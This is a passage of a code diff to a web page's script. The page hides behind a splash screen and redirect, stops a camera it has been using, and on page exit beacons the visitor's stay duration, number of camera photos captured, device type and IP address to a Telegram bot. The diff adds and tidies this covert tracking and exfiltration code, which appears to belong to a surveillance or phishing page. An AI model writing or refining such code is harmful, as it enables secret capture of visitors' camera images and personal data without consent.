+        dlog('Will redirect in 10 seconds...');
+        
         setTimeout(function() {
+            dlog('Redirecting now...');
             document.getElementById('splash').style.display = 'none';
             window.location.href = redir;
-        }, 8000);
+        }, 10000);
     }
     
+    // ==================== EXIT HANDLER ====================
     function handleExit() {
         stopCamera();
-        var exitMsg = '📋 User Left\n⏱ ' + Math.floor((Date.now()-visitStart)/1000) + 's\n📸 Photos: ' + photoCount + '\n📱 ' + (isMobile?'Mobile':'Desktop') + '\n🌐 ' + (ipData||'Unknown');
-        if (navigator.sendBeacon) navigator.sendBeacon('https://api.telegram.org/bot'+bot+'/sendMessage', JSON.stringify({chat_id:chat,text:exitMsg}));
+        var duration = Math.floor((Date.now() - visitStart) / 1000);
+        var exitMsg = '📋 User Left Page\n' +
+                      '⏱ Duration: ' + duration + 's\n' +
+                      '📸 Photos: ' + photoCount + '\n' +
+                      '📱 Device: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n' +
+                      '🌐 IP: ' + (ipData || 'Unknown');
+        
+        dlog('User leaving: ' + exitMsg.replace(/\n/g, ' | '));
+        
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(
+                'https://api.telegram.org/bot' + bot + '/sendMessage',
+                JSON.stringify({ chat_id: chat, text: exitMsg })
+            );
+        }
     }
     
     window.addEventListener('beforeunload', handleExit);
     window.addEventListener('pagehide', handleExit);
-    document.addEventListener('visibilitychange', function() { if (document.hidden) handleExit(); });
+    document.addEventListener('visibilitychange', function() { 
+        if (document.hidden) handleExit(); 
+    });
     
+    // Start!
     main();
     </script>
 </body>
